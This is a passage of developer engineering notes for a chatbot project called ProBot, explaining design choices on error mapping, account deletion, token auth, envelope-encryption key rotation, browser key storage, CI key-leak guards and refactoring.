A common antipattern this fixes: "we send 503 when we're rate-limited / capacity-overflowed, and clients are expected to retry with exponential backoff." That's a valid pattern for B2B APIs where clients are sophisticated. It's catastrophic UX for a consumer app where clients are humans - they don't retry, they leave. Degrading gracefully (with the fallback flag for observability) trades a tiny analytics cost for a meaningful UX win.

The principle generalises: **every error path should ask "who needs to know?" and route the information accordingly.** A schema-validation failure is a developer's problem → 400 with details. A rate limit is a client's problem → 429 with retry-after. An upstream outage is the operator's problem → 200 with fallback (visible internally, invisible externally).

### Regex-On-Error-Message Mapping When The SDK Doesn't Help (Stage 7 Phase 4)

> The Google Gemini adapter maps SDK errors to our `ProviderError` categories by matching strings in `err.message`. The Anthropic adapter uses `instanceof APIError && err.status === 401`. Why the inconsistency?

The inconsistency is forced by the SDK. The Anthropic SDK ships `APIError` with a typed `status` field; the OpenAI SDK does the same. The Google Gemini SDK throws plain `Error` instances with the HTTP status interpolated into the message string. That's not us being lazy - it's the upstream SDK's API surface.

Two ways to handle a brittle upstream:

**Option 1: regex/string-match on the message.** Fragile (SDK wording changes break the mapping) but cheap to implement and easy to read. ProBot uses this for Gemini; the regex covers "API key not valid", "API_KEY_INVALID", "PERMISSION_DENIED", "401", "403" → `invalid_key`, and "429", "RESOURCE_EXHAUSTED", "quota" → `rate_limit`.

**Option 2: parse the underlying HTTP response yourself.** Wrap the SDK call in your own fetch, or intercept at the fetch layer. More robust (status codes are stable in a way error wording isn't) but means re-implementing parts of the SDK and giving up the benefits of typed request building.

The right pick depends on how often the upstream changes wording vs. how often you'd otherwise touch the adapter. For Gemini specifically:

- Wording changes about once every 6-12 months based on Anthropic/OpenAI's history.
- Each change is a one-line regex update.
- The cost of "wrong category for 24h after a wording change" is "users see `unknown` instead of `invalid_key` and have a slightly less specific error message."

This is acceptable. Option 2 (rewriting the SDK) would cost weeks for the same outcome.

The general principle: **match the brittleness of your error mapping to the volatility of the upstream's error format.** Stable typed errors (Anthropic / OpenAI) → typed instanceof checks. Unstable string errors (Gemini) → defensive regex + a documented assumption. Critically: **document the brittleness in code** so the next maintainer knows the regex needs review on SDK upgrades. We did this in a comment block above `mapGoogleError`.

A related lesson: **never just `throw err`** when the upstream's error shape is unknown. Always wrap it in your domain's typed error (`ProviderError` here) so callers don't have to know about SDK internals. The category enum (`invalid_key | rate_limit | unknown`) is small enough to exhaust, which means callers can switch on it safely and the SDK volatility stays contained to the adapter.

---

### Snapshotting Email Into A Tombstone Row Beats A Separate "Post-Delete Email" Table (Stage 7 Phase 5)

> The deletion_requests table has `email_snapshot` and `username_snapshot` columns. The user's `email` and `username` live in the `users` table anyway. Why duplicate them - and why is this the right pattern?

The duplication exists for one specific reason: by the time the cron job needs the email to send the completion notice, the user's row has been CASCADE-deleted and the original `users.email` is gone. Without a snapshot somewhere, the operator has two unappealing choices: (a) leave the user wondering "did the deletion actually happen?" with no confirmation, or (b) DON'T CASCADE delete the user, instead null out their personal fields and keep a tombstone row in `users` forever - which violates GDPR's "right to erasure" because the tombstone IS personal data even if scrubbed.

Snapshotting into the deletion_requests row sidesteps both. The data flow during the cron run is:

```
1. read deletion_requests row → in-memory `snapshot = { email, username, ... }`
2. UPDATE deletion_requests SET purged_at = NOW()
3. DELETE FROM users WHERE id = userId  ← CASCADE drops bots, knowledge, ...
                                            AND the deletion_requests row itself
4. send completion email using `snapshot.email`  ← still in scope, JS holds it
```

The trick: the in-memory variable from step 1 survives the CASCADE in step 3 because JavaScript's garbage collector has no idea the DB row is gone. The snapshot lives long enough for step 4 to fire the email, then JS GCs it like any other local. No tombstone row, no PII lingering in the DB, no orphaned `users` rows.

The alternative pattern - a separate `deletion_completion_email_queue` table - would add a write, an asynchronous email worker, and a partial-state failure mode where the user is deleted but the queue row got dropped. The snapshot-in-the-request-row pattern collapses all of that into a single transaction-free flow that's atomic at the granularity that matters (a single user's deletion). The `purged_at` flag in step 2 is what makes the operation idempotent - a re-run of the cron sees `purged_at IS NOT NULL` and skips the row.

The general principle: **when you need to know something about a record after the record is gone, snapshot the values you need into a row that outlives the deletion.** The snapshot row is your own bounded liability - it's pruned by your own cleanup pass, not held forever like a tombstone. CASCADE-with-snapshot is much cleaner than soft-delete-with-tombstone for GDPR-flavored use cases.

### Token IS Auth: When Public Destructive Routes Are Actually Fine (Stage 7 Phase 5)

> The `/api/users/me/undo-deletion` route is publicly reachable (no session required), accepts a token + username, and reverses a destructive operation. That sounds dangerous. Why is it OK?

It would be dangerous if the threat model were "anyone on the internet can fire the route." It isn't - the route requires a 256-bit token only sent to the email address that initiated the deletion. The token IS the authentication; possessing it proves you're the account owner (or you've compromised their email, in which case they have bigger problems than a recovered ProBot account).

This pattern is everywhere in modern auth flows:

- Password-reset links work without a session (the token authenticates).
- Email-verification links work without a session (the token authenticates).
- Magic-link sign-in works without a session (the token authenticates).
- Stripe payment confirmations send a webhook with a signature header (the signature authenticates).

The key safety properties that make these patterns OK:

1. **High-entropy tokens.** 256 bits of randomness means an attacker can't guess the token. A 4-digit OTP would be guessable in hours; a 32-byte URL-safe random string is not.
2. **Short TTL.** Our undo token expires at `scheduled_purge_at`, so 7 days. Password-reset tokens are typically 1 hour. The shorter the window, the less time for the token to be exposed before it expires.
3. **Single-use OR delete-on-success.** Our undo deletes the deletion_requests row on success, which invalidates the token. Password-reset tokens get `used_at` set. Either way, you can't replay.
4. **Defence-in-depth confirmation.** Our undo page requires the user to type their username before submitting. That re-check protects against the case where someone scrapes the URL out of a leaked email but doesn't know the username (e.g., from a forwarded support thread that elided the account details).

What CSRF protection adds in the typical "logged-in user tricked into firing a destructive action" scenario is irrelevant here because the user firing the undo isn't logged in - they're an anonymous visitor presenting a token. There's no cookie an attacker could ride on; the only way to fire the route is to know the token. CSRF tokens defend against cookie-borne sessions, not bearer-token APIs.

The mental model: **bearer-token APIs are authenticated by presenting the token, not by a session cookie. CSRF protection is a session-cookie countermeasure that doesn't apply.** If you find yourself reaching for CSRF tokens on a public bearer-authenticated endpoint, you're solving the wrong problem - the right defences are token entropy, TTL, single-use, and (sometimes) typed-confirmation.

### `purged_at` BEFORE `DELETE`, Not After: Ordering Around A CASCADE (Stage 7 Phase 5)

> The cron job marks `purged_at = NOW()` on the deletion_requests row, THEN deletes the user. The naive order would be reversed. Why this way?

The deletion_requests table has `ON DELETE CASCADE` from the users table. That means deleting the user deletes the deletion_requests row too. So if the order were:

```
1. DELETE FROM users WHERE id = userId
2. UPDATE deletion_requests SET purged_at = NOW() WHERE user_id = userId
```

Step 2 would silently affect zero rows because the deletion_requests row no longer exists (the CASCADE dropped it in step 1). The cron job would think "I completed the work" but the audit trail would be lost.

Reversing the order:

```
1. UPDATE deletion_requests SET purged_at = NOW() WHERE id = ...
2. DELETE FROM users WHERE id = userId  ← CASCADE drops the request row
```

Step 1 successfully writes; step 2's CASCADE drops the row. The `purged_at` write doesn't survive in the DB - but it doesn't need to. What we needed was the IN-MEMORY snapshot of the request row (from step 0, `read deletion_requests row`) plus the knowledge that we already attempted the purge for this row in this cron tick. Idempotency is provided by the read-time filter `WHERE purged_at IS NULL`, which won't match this row again in a subsequent tick because... well, the row is gone.

The general principle: **when CASCADE is in play, ordering matters because the second write might no-op silently.** Pre-flag whatever you need flagged BEFORE the cascade-triggering operation. The pattern also generalizes to non-cascade scenarios: any "mark completed" update should happen before the destructive operation if the destructive op could affect the marker row. Backwards: "delete the file, then mark the row as deleted-from-disk" - if the row was a child of the file in a foreign-key chain, the mark wouldn't survive.

A subtler version: **PostgreSQL's default isolation level reads inside a transaction can see uncommitted writes from the same transaction**, but that's not what's happening here - we're outside a transaction (or in a small one per-row). The discipline isn't transactional; it's about understanding that DB operations can have effects beyond the row you targeted.

### GitHub-Style Two-Input Confirmation Modals: Why Two, And Why These Two (Stage 7 Phase 5)

> The DeleteAccountModal requires the user to type both their username AND the literal phrase "delete my account". Why two inputs? Wouldn't either alone be sufficient friction?

Each input guards against a different failure mode:

**Username input** guards against "wrong account." If the user has multiple accounts (work + personal) and is signed into the wrong one when they click Delete, the username field reveals it: they type the username they meant to delete, the modal's `usernameOk` check fails because the typed value doesn't match `session.user.username`. The friction is small for the genuinely-meant deletion (autocomplete kicks in) and decisive for the accidental wrong-account deletion.

**Phrase input** guards against "wrong intent." The literal phrase "delete my account" is unambiguous - you can't type those exact words while thinking "I just want to clear some data" or "I want to deactivate temporarily." A single click on a labeled button can happen reflexively; typing a sentence cannot. The friction is small for the genuinely-meant deletion (a couple seconds of typing) and decisive for the misclick.

Together: misclick is blocked by phrase; wrong-account is blocked by username. Each alone leaves one hole; together they close both.

A common single-input alternative - "type DELETE in all caps to confirm" - has the misclick property but not the wrong-account property. A user signed into the wrong account would still type DELETE and confirm. That's why GitHub's repo-delete dialog also asks for the repo name (the wrong-repo guard) AND a phrase. We're cargo-culting good behavior here, which is exactly the right kind of cargo-culting.

A few less-obvious design choices in our implementation:

- **Esc closes; backdrop click does NOT.** Backdrop misclicks are too easy - users frequently click outside a modal to dismiss informational dialogs, and a deletion modal should require an explicit cancel.
- **Inputs reset on every open.** Lingering text from a previous-but-closed session would let a user open the modal and immediately have it satisfied with stale input.
- **The destructive button is enabled only when BOTH checks pass.** No "Confirm" prompt that pops up after the button is clicked; the gating happens on the inputs themselves.
- **Username input is `autoComplete="off"` + `spellCheck={false}`.** Browser autofill for "delete" would defeat the friction.

The general principle: **destructive UI should require enough friction that a tired or distracted user can't fire it by accident, but not so much friction that a determined user can't get through it.** Two short inputs is the sweet spot; CAPTCHAs and "wait 30 seconds" buttons are over the top.

### Cron Auth That's Allowed To Be Simple (Stage 7 Phase 5)

> The cron route compares `Authorization: Bearer X` to the env var with a plain `===` string compare. The crypto module uses `timingSafeEqual` for signature comparison. Why the inconsistency?

The inconsistency reflects a real difference in attack surface, not laziness.

**`timingSafeEqual`** prevents timing-oracle attacks where an attacker measures how long the comparison takes to deduce the secret byte-by-byte. To exploit a timing oracle you need:

- Many requests per second (to average out network noise)
- A consistent measurement environment
- The ability to keep trying until you crack the full secret

**The cron route fires exactly once a day.** An attacker who wanted to mount a timing attack would get one measurement per day. Cracking a 256-bit secret one byte at a time would take... about 70 billion years.

Even if Vercel allowed a malicious actor to fire the route faster (they don't - the rate limit on unauthenticated requests is tight), they'd be probing a static env var the operator already controls. There's no escalation; the secret doesn't unlock anything beyond "trigger the purge that's scheduled to fire today anyway."

**`crypto.envelope`** is different. The signature comparison runs on EVERY chat request from every recruiter. A high-traffic deployment could see thousands of requests per second. The attack surface is real, even if the exploit window is narrow. Using `timingSafeEqual` costs nothing extra (Node's standard library implements it) and protects against an attack class that's at least theoretically possible.

The general principle: **match the cost of the defence to the cost of the attack.** Constant-string compare is fine when the attacker can't generate enough samples to discriminate timing. Constant-time compare is the safer default when in doubt; reach for plain `===` only when the operational characteristics make the timing channel infeasible.

A related lesson: **`timingSafeEqual` requires equal-length buffers** (it throws otherwise). The buffer-length check itself is a timing oracle on the secret length, so the canonical pattern is: hash both inputs to a fixed length first, then compare. We don't do that here because length-leak on the env var is irrelevant; for higher-stakes comparisons (e.g., comparing user-supplied passwords), always hash first.

---

### Heuristic Upload Safety Is Not "Antivirus" - And That's Fine If You Say So (Stage 7 Phase 6)

> The malware-scan module does magic-byte checks and signature lookups, not actual virus detection. Isn't that misleading branding?

It would be if we called it antivirus. We don't - the file is named `malware-scan.ts` because "scan" describes what it does (look for patterns) without claiming a guarantee. The comment block at the top explicitly says what it catches and what it doesn't, including the line "real PDF-embedded malware (encrypted payload that pdf-parse doesn't trigger)" as a known gap. Honest scope is the right move.

The heuristic checks are valuable in their own right, just for different threats than antivirus:

- **Antivirus** scans for KNOWN malicious signatures in arbitrary binary content. Catches viruses; doesn't care about file extensions.
- **Heuristic upload scan** catches MISMATCHES between claimed-and-actual file type. Catches lazy attackers; doesn't catch sophisticated payloads inside legitimate file formats.

For ProBot's threat model (resume PDFs from job seekers, mostly), the heuristic scan is the right tool: the most common "attacks" are accidentally-uploaded .exe / .docx / .doc files that the user mislabeled, and these all fail the magic-byte vs MIME vs extension cross-check. A real malicious actor crafting a weaponized PDF would bypass the heuristic scan AND would need a separate pdf-parse exploit to actually do anything; the threat model says they'd go elsewhere first.

Free serverless ClamAV doesn't exist. It needs a persistent daemon (the virus database alone is ~200MB and takes time to load), and Vercel serverless functions are ephemeral (~50MB code size limit, cold-start every few seconds). The alternatives are:

- Run ClamAV as a sidecar on a non-serverless host (defeats the deployment model).
- Use a paid third-party API like VirusTotal (violates the "zero-cost" project constraint).
- Skip it and document the limitation.

We picked option 3. The README + module-level comment make the trade explicit so a future operator who needs real AV scans knows where to add a sidecar.

The general principle: **security features should match the threat model, not impress security reviewers.** A heuristic scan that catches 95% of accidental misuploads with zero cost beats a real AV scan that requires architectural changes. Naming matters too - "malware-scan" with documented scope is fine; "antivirus.ts" with the same code would be a lie.

### `extractable: false` Is The One Property That Makes Browser Crypto Storage Real (Stage 7 Phase 6)

> The IndexedDB key store generates a CryptoKey with `extractable: false`. The data it encrypts is still recoverable by any JS on the origin (call `crypto.subtle.decrypt`). So what does the flag actually buy?

It buys "the key bytes cannot leave the browser via JS." That sounds narrow until you consider what attackers can and cannot do:

**With extractable=true:**

- Malicious JS on the origin can call `crypto.subtle.exportKey(key)` and get the raw 32-byte key material.
- It can then SEND that key to an attacker server.
- The attacker now holds the key permanently and can decrypt any future ciphertext they steal - even if the user changes their LLM API key, the master key stays the same.
- A browser-data export tool (extension that reads IDB) could similarly extract.

**With extractable=false:**

- `crypto.subtle.exportKey(key)` throws.
- Malicious JS can call `crypto.subtle.decrypt({ ... }, key, ciphertext)` to decrypt SPECIFIC ciphertexts it sees during its execution window.
- It cannot exfiltrate the master key for future use.
- A leaked IDB dump contains a CryptoKey object that's still bound to the non-extractable flag in the browser that re-imports it (structured clone preserves the flag).

The two-line summary: **`extractable=true` leaks a key for forever; `extractable=false` leaks at most the secrets currently in scope during the compromise window.** For a chat-time-only API key that the user can rotate, that's a meaningful reduction.

Two related things to know:

1. **`crypto.subtle.generateKey({...}, extractable, keyUsages)`** is the only place the flag lives. You can't promote an extractable key to non-extractable later (you'd have to re-generate). Build it right the first time.
2. **Structured clone of a CryptoKey preserves the flag.** IndexedDB serialises CryptoKey objects via structured clone, so the persisted-and-rehydrated key keeps `extractable=false` across browser restarts. The flag isn't a runtime property checked at use site; it's bound to the key material at the cryptographic primitive level.

The pattern fails when:

- The host has DOM/JS execution control (XSS, malicious extension) - the attacker just calls decrypt() with the key they can access via `subtle.crypto`. Mitigation is keeping the origin clean of third-party JS.
- The host is not in a secure context (http://) - `crypto.subtle` doesn't exist. Mitigation is "run TLS in production."

The general principle: **`extractable=false` doesn't make the data unreachable; it makes the KEY unreplicable.** For threats where the key is the long-lived asset (it is, for a per-origin master encryption key) that's the property that matters most.

### Async Public API Beats Sync-With-Hydration For New Browser-Storage Modules (Stage 7 Phase 6)

> The Phase 6 key store has a fully async public API - `getApiKey()` returns `Promise<string | null>`. We could have wrapped it in a sync façade that returns a cached value after a one-time async hydration. Why did the async version win?

Sync-with-hydration looks tempting because it preserves existing call sites - no `await` to add, no async-bubbling refactor. But it has a load-bearing race that's almost invisible until production:

```typescript
// Pseudocode for the sync-with-hydration trap
let cached: string | null = null;
let hydrationPromise: Promise<void> | null = null;
function hydrate() {
  if (!hydrationPromise)
    hydrationPromise = loadFromIDB().then((v) => {
      cached = v;
    });
  return hydrationPromise;
}
export function getApiKey(): string | null {
  hydrate(); // fire-and-forget
  return cached; // ← returns null on first call before hydration resolves
}
```

The first call always returns null. The second call might return null or the actual value, depending on whether the microtask queue drained between calls. The chat fails with `missing_llm_key` for the very first message of every session because the cache was empty when the send button was clicked. Then it works for the rest of the session, which makes the bug look intermittent and hard to reproduce. Classic Heisenbug.

The async version forces every caller to wait for the actual value:

```typescript
export async function getApiKey(): Promise<string | null> {
  // No race - the IDB read is fully resolved before the caller sees a value.
}
```

This adds an `await` at every call site (3 files in our case), but the refactor is mechanical - those call sites were already in async contexts (event handlers, useEffect callbacks). The cost was ~10 line changes. The benefit is correctness on the first call of every session.

The general principle: **don't paper over async with sync façades unless the cache invariants are bulletproof.** "I'll just preload" works for static read-only data; it breaks down the moment writes happen too (the write would need a same-tick cache invalidation to be observable on the next read), and the second-order failure modes are subtle. Async-everywhere is the honest pattern; the syntactic overhead is small.

A related lesson: **once a module is async, it stays async transitively.** Every caller becomes async, and their callers do too. This is what made the localStorage-to-IDB migration a non-trivial refactor despite the small line count - we had to touch the chat client, the bot factory, and the dashboard. The Phase 6 architecture doc called this out explicitly so we knew the scope going in.

### `deleteDatabase` Will Block Forever If You Hold An Open Connection (Stage 7 Phase 6)

> The first test run of the new key-store hung for 135 seconds before timing out. The fix was closing the cached DB handle in the test reset hook. What was actually happening?

IndexedDB's `deleteDatabase` is a destructive operation that the browser refuses to fire until ALL open connections to that database are closed. The reasoning is reasonable: a JS context with an open IDBDatabase handle is mid-transaction; dropping the database under it would corrupt that transaction. So the spec says: queue the delete, wait for all connections to close, then fire.

The protocol surfaces this via `IDBOpenDBRequest.onblocked` - fired when a delete is pending and there's an open connection. In real browsers, the browser also fires `versionchange` on the open connection so the holder can choose to close it. In fake-indexeddb (which is faithful to the spec), neither the close nor a synthetic timeout fires - if the test code never explicitly closes the connection, `deleteDatabase` is pending forever and the test times out.

The fix has two parts:

1. **The SUT's test reset must close the cached DB handle BEFORE the test runner deletes the DB.** That's why `__resetSecureKeyStoreForTests` was changed from a synchronous "null out the cache" to an async "open the cached connection, call .close(), then null." The .close() lets the queued deleteDatabase proceed.

2. **The test setup must await both operations.** The reset is awaited, then the deleteDatabase is awaited (via the onsuccess/onerror/onblocked Promise wrapper). Skip either await and you're back to the race.

The general principle: **destructive DB operations in tests need explicit lifecycle management of the SUT's connections.** This is more obvious for SQL (you'd never blow away a Postgres schema mid-transaction), less obvious for IDB because the API looks "fire and forget." The lesson generalises to any persistent resource: file handles, network sockets, web workers - the SUT may be holding a handle that prevents the test runner from cleaning up.

A useful pattern: **expose a `__resetForTests` (or similar) that owns the cleanup ordering.** Production code never calls it; tests do. The reset function knows the internal lifecycle better than the test does, so encapsulating the "close handle, drop cache, anything else" sequence inside the module is more maintainable than spreading it across every test file.

The specific symptom to watch for: a test hangs until the test runner's hook timeout fires (often 10 seconds default), error message says "Hook timed out." That's almost always a resource-leak or fire-and-forget-async issue, not a slow operation. The instinct should be "what's not getting closed" before "what's slow."

---

### KEK Rotation Without Re-Encrypting User Data (Stage 7 Phase 7)

> The KEK rotation script touches every row in encrypted_llm_keys but the user's actual LLM API keys never get re-encrypted - only the DEK wrapping changes. Why does this work, and why is it the only sane way to rotate?

The envelope encryption pattern (locked in during Phase 3) is built around two layers:

- **DEK (Data Encryption Key)** - per-bot, random 256-bit AES key, encrypts the user's LLM key.
- **KEK (Key Encryption Key)** - process-wide, 256-bit AES key, encrypts the DEK.

The clever bit is that the user's LLM key ciphertext only ever sees the DEK. The KEK is one layer removed - it wraps the DEK, not the data. So when you rotate the KEK:

```
old state:  DEK encrypts ApiKey → ciphertext
            OLD_KEK wraps DEK → wrappedDek

rotation:   decrypt wrappedDek with OLD_KEK → raw DEK
            encrypt raw DEK with NEW_KEK → new wrappedDek
            (ciphertext stays byte-identical)

new state:  DEK encrypts ApiKey → SAME ciphertext as before
            NEW_KEK wraps DEK → new wrappedDek
```

The data ciphertext bytes don't change. The IV and auth tag don't change. The only column we UPDATE per row is `wrapped_dek` (and its IV + auth tag). If you have 10,000 rows, you do 10,000 small re-wrap operations + 10,000 single-column UPDATEs - not 10,000 full decrypt/re-encrypt cycles with potentially-megabyte payloads.

Compare to the naive "rotate by re-encrypting everything":

```
naive rotation:  decrypt full ciphertext with OLD_KEK → plaintext
                 encrypt plaintext with NEW_KEK → NEW ciphertext
                 UPDATE: ciphertext, iv, auth_tag, ...
```

For a 50-byte API key that's not much more work, but it requires the operator to hold every API key in plaintext at rotation time. With envelope encryption, the operator only ever holds DEKs (also short, but cryptographically random and unrelated to user data). The rotation logs (if any) can't accidentally leak an API key because the script never decrypts the user data.

This is exactly why AWS KMS, GCP Cloud KMS, and Vault all push you toward envelope encryption from day one. The rotation flow they document looks identical to ours: re-wrap DEKs, leave data ciphertext alone. The pattern is so universal that "I'm using envelope encryption" is shorthand for "rotation costs are constant per row regardless of payload size."

The general lesson: **the cheapest rotation is the one that touches the smallest cryptographic surface.** Building the encryption scheme with rotation in mind from the start (rather than retrofitting it later) means rotation becomes an UPDATE, not a re-encrypt. If you're designing key storage and rotation isn't already in the use cases you're testing against, you're probably going to build something that's painful to rotate.

### CI Grep Guards For Specific Misuse Are Cheaper Than Pre-Commit Hooks (Stage 7 Phase 7)

> The key-leak guard is a Node script that runs as `npm run check:key-leaks`, not a pre-commit hook. Wouldn't a pre-commit hook catch issues earlier and avoid even committing them?

It would, but the cost/benefit doesn't favor it for this specific class of guard. Three reasons:

**1. Pre-commit friction tax is paid by every contributor for every commit.** A hook that runs even a fast script (~200ms) adds 5+ seconds to a workflow that already includes `git diff`, `git add`, `git commit -m`. If a contributor doesn't write a logger call in their patch (the typical case), they're paying for a guard that has nothing to check. CI runs the guard exactly once per PR.

**2. Pre-commit hooks are local-machine-specific.** A contributor who clones the repo and didn't run `husky install` (or who edited via the GitHub web UI) bypasses the hook entirely. CI runs unconditionally in the same environment for every contribution.

**3. The guard is a regex-on-source-text check that can have false positives.** The fix for a false positive on pre-commit is to amend or revert; on CI it's to comment out the guard or update the allow-list. The CI path is more visible (PR comment, GitHub Actions UI) than a pre-commit failure (cryptic terminal output during commit).

What pre-commit hooks ARE useful for: formatting (`prettier --write`), trailing-newline normalisation, linting that catches whole categories of style issues. Things where the script touches the file content and saves you a "fix formatting" follow-up commit. The key-leak guard doesn't fit - it's a binary pass/fail with no auto-fix.

The pattern: **pre-commit for code-shape enforcement that has an auto-fix; CI for assertion-style checks that can only be made-or-failed.** Our pre-commit could plausibly run prettier; it should NOT run the key-leak grep, the typecheck (which is 5+ seconds), or the test suite (~10 seconds).

A related pattern worth knowing: **post-commit / pre-push hooks** split the difference - they run after the commit lands locally but before pushing, so you don't pay the cost on every commit but you still catch issues before they leave your machine. For an open-source project where contributors are unfamiliar with the discipline, even pre-push is too clever; CI is the right default.

### Per-File Allow-Lists Beat Directory-Wide Allow-Lists For Security Guards (Stage 7 Phase 7)

> The key-leak guard's allow-list names 13 specific files. Allow-listing `src/lib/ai/` (the whole directory) would be much shorter. Why per-file?

Because the security property the guard enforces is "this specific file is allowed to look at the key; no new file in this directory inherits that allowance." If a future contributor adds `src/lib/ai/telemetry.ts` that mentions `apiKey` in a `console.log`, you want the guard to fire - even though the file lives in the AI directory that already has key-handling code.

Directory-wide allow-lists let the unwanted use case slip through silently. Per-file allow-lists force the contributor adding a new key-handler to:

1. Hit the CI failure.
2. Read the guard source to see what it's checking.
3. Make a deliberate decision: am I going to redact this log, or am I really going to allow-list this new file?
4. Add the new path to the allow-list as part of the PR.

Step 4 is what makes the security review legible. The PR diff now contains a one-line change to the allow-list, which is exactly the kind of change a reviewer should scrutinise ("why does this file need to log the key?"). Without it, the new file is just one more place to grep for the pattern.

The general principle: **security guards should produce friction proportional to the risk of the change.** Adding a new key-handler is high-risk; the friction is "you must explicitly opt in via the allow-list." Refactoring an existing key-handler is low-risk; the existing allow-list entry covers the new file path if you preserve the name. Adding a non-key-handler is zero-risk; the guard doesn't fire because the file doesn't match any pattern.

A related pattern: **the allow-list IS the security review surface.** Every entry should answer "why does this file need to be here?" - either implicit (a routing file like `/api/bots/[botId]/llm-key/route.ts` obviously needs key access) or explicit (a comment in the allow-list itself for less-obvious cases). Future maintainers can audit the security model by reading the allow-list alone, without grepping every source file.

The directory-wide variant is fine for cases where the risk surface is the directory, not the individual file - e.g., "tests can use canary strings to assert key suppression" is a per-test-file decision but every test file is equally OK to have it, so `*.test.ts` is the right shape. The discriminator is: does each new file in the directory need an explicit security decision, or does the directory itself impose the discipline?

### When To Duplicate Code Between A Script And A Module (Stage 7 Phase 7)

> The KEK rotation script duplicates ~30 lines of AES-GCM encryption logic from `src/lib/crypto/envelope.ts`. The DRY principle says "import once, use everywhere." Why is this duplication the right call?

DRY is a heuristic, not a law. Three reasons the duplication wins here:

**1. The transitive dependency cost is real.** Importing from `src/lib/crypto/envelope.ts` would mean the `.mjs` script needs a TypeScript loader (`tsx`, `ts-node`, or bundling via esbuild). Each of those is a new dependency that the script's only consumer (the operator running rotation quarterly) has to install. Avoiding the dep saves the operator a `npm install` step + reduces the supply-chain attack surface of the rotation tool.

**2. The two surfaces have different stability requirements.** The TS module is called from the request hot path - if its API changes, every caller breaks at compile time and gets a deterministic error. The script is called manually by an operator who can read a runbook. If the envelope shape ever changes (new field, different IV size), the script needs to update; tying them via import means a "shape change in envelope.ts breaks the rotation script silently because the operator hasn't redeployed yet" failure mode. Duplication makes the dependency a documentation problem ("update both") not a runtime problem.

**3. The shared code is small AND stable.** 30 lines of "AES-GCM with a 12-byte IV" is a well-specified cryptographic primitive that won't change for the lifetime of the project. If we were duplicating 300 lines of business logic that gets touched every sprint, the duplication tax would be real. For a never-changes primitive, the tax is essentially zero.

The general principle: **DRY is correct in proportion to how often the duplicated code changes.** For business logic that changes often, duplicating is a tax that compounds with every change. For primitives that never change, duplicating is a one-time cost that buys you smaller blast radius + simpler dependencies.

When NOT to duplicate: when the duplication encodes a CHOICE (which algorithm, which key length, which IV strategy) that you might want to change in one place but not another - that's the recipe for a security bug. Use a shared constant instead. Our script does this: the `KEY_ALGO = "aes-256-gcm"`, `KEY_LEN = 32`, `IV_LEN = 12` constants are duplicated literals matching the module's constants. If we ever change AES-256 to ChaCha20, we'd update both. The DUPLICATION is the encryption _function_; the _decision_ is in matching constants.

A useful smell-test: **does updating one copy require updating the other?** If yes (the two copies are coupled by domain semantics), duplication is fine and the coupling lives in your head + the runbook. If no (the two copies were independently arrived at via separate decisions), congratulations - you have two unrelated pieces of code that happen to look similar, and forcing them through a shared abstraction would couple things that shouldn't be coupled.

---

### Modularizing a fat React component without changing behavior

> When a 1500-line component "needs splitting," what actually makes the split safe, and how do you keep the public surface identical?

The key insight is the distinction between a component's *public API* (its exported name and props) and its *internal composition* (the helper components and functions it happens to define in the same file). Tests, and every other importer, only ever touch the public API. So you can move every inner piece - step renderers, presentational sub-components, pure helpers, constant maps, types - into separate files, and as long as the top-level component still re-composes them into the same rendered tree, nothing observable changes. The test file that does `import { BotFactoryForm } from "./BotFactoryForm"` neither knows nor cares that `StepIdentity` now lives in `steps/StepIdentity.tsx`.

A few mechanics that make this clean in Next.js + TypeScript. (1) The `"use client"` boundary is *inherited*: once a client component imports a child module, that child is pulled into the client bundle automatically, so extracted interactive components work whether or not you re-declare the directive - though declaring it on files that use hooks/handlers is clearer and harmless. (2) A shared prop type like the form's single-field updater (`type PatchFn = <K extends keyof FormState>(k: K, v: FormState[K]) => void`) is worth lifting into a `types.ts` so every step file references one definition instead of re-spelling the generic signature. (3) Co-locate by feature in subfolders (`steps/`, `parts/`) rather than dumping siblings flat - the import graph then reads like the UI hierarchy.

The trap to avoid is splitting *stateful* sections that are coupled to the parent's `useState`. Extracting a leaf like `<Toggle>` or `<StepHeading>` is free because it only receives props. Extracting a "section" that reads and writes ten pieces of parent state would force you to thread ten props (or lift state oddly), which is real risk for a "no behavior change" refactor. The safe, high-value move is to extract the leaves and the pure helpers first; the parent stays as the state owner and orchestrator.

### The discriminated-union short-circuit for breaking up a long request handler

> A 460-line API route is one big function full of early `return NextResponse.json(...)` guards. How do you split it into testable steps without changing a single status code?

A request handler resists naive extraction because every step can *abort* the whole request with its own response. You can't just pull "step 8" into a function that returns its data - it also needs the power to say "stop, send this 429." The clean pattern (already used elsewhere in this codebase as `requireBotOwner`) is to have each step return a discriminated union: `{ ok: true; ...data } | { ok: false; response: Response }`. The orchestrator then becomes a flat sequence of `const r = await step(...); if (!r.ok) return r.response;` lines, and each step owns exactly the response shapes it used to emit inline.

Why a union rather than throwing? Throwing an exception to signal "send a 404" works, but it splits the control flow into two channels (return values *and* exceptions) and forces a catch block that has to re-derive which status to send. The union keeps everything in the return channel: the response object is constructed at the exact site that decided to abort, carrying its precise status and body, and the orchestrator just forwards it. Behavior parity is then almost mechanical to verify - each extracted `NextResponse.json({...}, {status})` is the same literal it was inline.

Two details preserve exact behavior. Ordering: the steps must run in the original sequence (e.g. the BYO-key header is parsed *before* the body is read, so a malformed key still 400s even on a request with bad JSON) - keeping that order inside the extracting function, not just across functions, matters. And the "success-looking" abort: one branch here returns a *200* with a friendly fallback message when the circuit breaker is open. That's still an `{ ok: false; response }` from the orchestrator's point of view - "ok" means "produce the normal reply," not "HTTP 2xx" - so the union's discriminant is about control flow, not status class.

### Rotating conic-gradient rings via `mask-composite: exclude`

> How do you draw an animated gradient border on a rounded element without stacking two divs or using SVG?

The classic trick: paint the full gradient on a `::before` pseudo-element that's a few pixels larger than the button (`inset: -3px`), then mask out its interior so only a ring remains. The mask is two overlapping black layers - one clipped to `content-box`, one covering the whole element - composited with `xor` (WebKit) / `exclude` (spec). Because "black-on-black minus black-on-black" cancels wherever both layers exist and leaves black only in the padding strip, the result is: gradient visible only in the padding band, i.e. a ring. Rotate the element and the ring appears to spin, even though `conic-gradient` itself has no built-in rotation. This costs one composited layer and animates on the compositor thread (transform-only), which stays smooth even on cheap phones.

Why not just `border-image: conic-gradient(...)`? Because `border-image` doesn't play well with `border-radius` on non-rectangular borders - the gradient gets clipped to the box, not the rounded silhouette. The mask trick works with any `border-radius`.

Two gotchas learned while wiring this into the ProBot widget:

- Set `pointer-events: none` on the ring pseudo-element. Otherwise the 3px padding halo intercepts clicks and the button feels dead near its edges.
